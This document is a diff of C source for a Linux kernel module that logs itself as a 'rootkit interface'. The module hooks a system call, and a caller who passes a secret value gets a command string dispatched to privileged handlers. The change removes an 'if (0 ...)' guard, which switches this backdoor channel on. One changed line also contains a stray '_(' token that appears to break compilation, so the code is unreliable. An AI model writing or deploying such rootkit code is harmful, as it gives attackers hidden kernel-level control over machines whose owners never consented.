@@ -60,37 +60,37 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
 
   /* need correct secret */
 
-  if (secret == iface__secret) {
-    /*
-    get the command
+  if (secret != iface__secret)
+    return (*iface__hook.original)_(secret, (unsigned long) command, arg0,
+      arg1, arg2, arg3);
 
-    we don't care if this fails, because `strcmp`
-    will take care of invalid buffers
-    */
+  /*
+  get the command
 
-    memset(command_buf, '\0', sizeof(command_buf));
-    strncpy_from_user(command_buf, command, sizeof(command_buf));
+  we don't care if this fails, because `strcmp`
+  will take care of invalid buffers
+  */
 
-    /* grab the command handler */
+  memset(command_buf, '\0', sizeof(command_buf));
+  strncpy_from_user(command_buf, command, sizeof(command_buf));
 
-    handler = NULL;
+  /* grab the command handler */
 
-    for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
-      if (!strcmp(command_buf, iface__commands[i].command)) {
-        printk(KERN_INFO "[rootkit interface] got command \"%s\".\n", command_buf);/////////////////////////////
-        handler = iface__commands[i].handler;
-        break;
-      }
+  handler = NULL;
+
+  for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
+    if (!strcmp(command_buf, iface__commands[i].command)) {
+      printk(KERN_INFO "[rootkit interface] got command \"%s\".\n", command_buf);/////////////////////////////
+      handler = iface__commands[i].handler;
+      break;
     }
-
-    if (0///////////////////////////////////////////////////
-        && handler != NULL)
-      /* the command exists, and has a handler */
-
-      return (*handler)(arg0, arg1, arg2, arg3);
   }
-  return (*iface__hook.original)(secret, (unsigned long) command, arg0, arg1,
-    arg2, arg3);
+
+  if (handler != NULL)
+    /* the command exists, and has a handler */
+
+    return (*handler)(arg0, arg1, arg2, arg3);
+  return -EINVAL;
 }
 
 int iface_init(void) { 
